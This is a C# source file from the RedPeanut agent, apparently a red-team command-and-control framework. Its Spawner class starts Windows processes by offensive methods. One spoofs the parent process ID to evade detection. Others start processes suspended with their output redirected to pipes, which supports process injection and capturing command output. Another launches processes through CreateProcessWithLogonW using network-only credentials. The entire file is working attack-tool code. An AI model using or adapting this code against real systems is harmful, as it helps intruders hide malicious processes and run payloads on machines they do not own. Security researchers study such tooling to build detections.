//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using RedPeanutAgent.Core;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace RedPeanutAgent.Execution
{
    class Spawner
    {
        public static bool CreateProcess(string processname, int ppid, Natives.CreationFlags cf, ref Natives.PROCESS_INFORMATION procInfo)
        {
            Natives.STARTUPINFOEX sInfoEx = new Natives.STARTUPINFOEX();

            sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
            IntPtr lpValue = IntPtr.Zero;

            Natives.SECURITY_ATTRIBUTES pSec = new Natives.SECURITY_ATTRIBUTES();
            Natives.SECURITY_ATTRIBUTES tSec = new Natives.SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            IntPtr pntpSec = Marshal.AllocHGlobal(Marshal.SizeOf(pSec));
            Marshal.StructureToPtr(pSec, pntpSec, false);
            IntPtr pnttSec = Marshal.AllocHGlobal(Marshal.SizeOf(tSec));
            Marshal.StructureToPtr(tSec, pnttSec, false);

            IntPtr lpSize = IntPtr.Zero;

            Natives.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            Natives.InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

            IntPtr parentHandle = Process.GetProcessById(ppid).Handle;
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, parentHandle);

            Natives.UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)Natives.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

            if (!Natives.CreateProcess(IntPtr.Zero, processname, pntpSec, pnttSec, false, (uint)cf, IntPtr.Zero, IntPtr.Zero, ref sInfoEx, out procInfo))
            {
                return false;
            }

            return true;
        }

        public static bool CreateProcess(IntPtr hReadPipe, IntPtr hWritePipe, string processname, bool inheritHandler, ref Natives.PROCESS_INFORMATION procInfo)
        {
            Natives.SetHandleInformation(hReadPipe, Natives.HANDLE_FLAGS.INHERIT, 0);

            var startInfo = new Natives.STARTUPINFO
            {
                hStdOutput = hWritePipe,
                hStdErr = hWritePipe,
                dwFlags = Natives.STARTF_USESTDHANDLES
            };

            if (!Natives.CreateProcess(IntPtr.Zero, processname, IntPtr.Zero, IntPtr.Zero, inheritHandler, Natives.CreateSuspended, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo))
            {
                return false;
            }
            return true;
        }

        public static bool CreateProcess(string processname, bool inheritHandler, ref Natives.PROCESS_INFORMATION procInfo)
        {
            Natives.STARTUPINFO startInfo = new Natives.STARTUPINFO();
            
            if (!Natives.CreateProcess(IntPtr.Zero, processname, IntPtr.Zero, IntPtr.Zero, inheritHandler, Natives.CreateSuspended, IntPtr.Zero, IntPtr.Zero, ref startInfo, out procInfo))
            {
                return false;
            }
            return true;
        }

        public static bool CreateProcessWithLogonW(string path, string binary, string arguments, Natives.CreationFlags cf, ref Natives.PROCESS_INFORMATION processInformation)
        {
            string domain;
            try
            {
                domain = Environment.UserDomainName;
            }
            catch (Exception)
            {
                domain = System.Environment.MachineName;
            }

            string username = Environment.UserName;

            return CreateProcessWithLogonW(username, "password", domain, path, binary, arguments, cf, ref processInformation);
        }

        public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, Natives.CreationFlags cf, ref Natives.PROCESS_INFORMATION processInformation)
        {
            Natives.STARTUPINFO startupInfo = new Natives.STARTUPINFO();
            startupInfo.cb = (uint)Marshal.SizeOf(typeof(Natives.STARTUPINFO));

            if (!Natives.CreateProcessWithLogonW(username, domain, password,
                Natives.LogonFlags.NetCredentialsOnly, path + binary, path + binary + " " + arguments, cf, 0, path, ref startupInfo, out processInformation))
            {
                return false;
            }
            Console.WriteLine("Process created");
            return true;
        }

        public static bool CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
        {
            var lpPipeAttributes = new Natives.SECURITY_ATTRIBUTES
            {
                nLength = Marshal.SizeOf(typeof(Natives.SECURITY_ATTRIBUTES)),
                bInheritHandle = true,
                lpSecurityDescriptor = IntPtr.Zero
            };

            if (!Natives.CreatePipe(out hReadPipe, out hWritePipe, ref lpPipeAttributes, 4089))
            {
                return false;
            }
            return true;
        }
    }
}
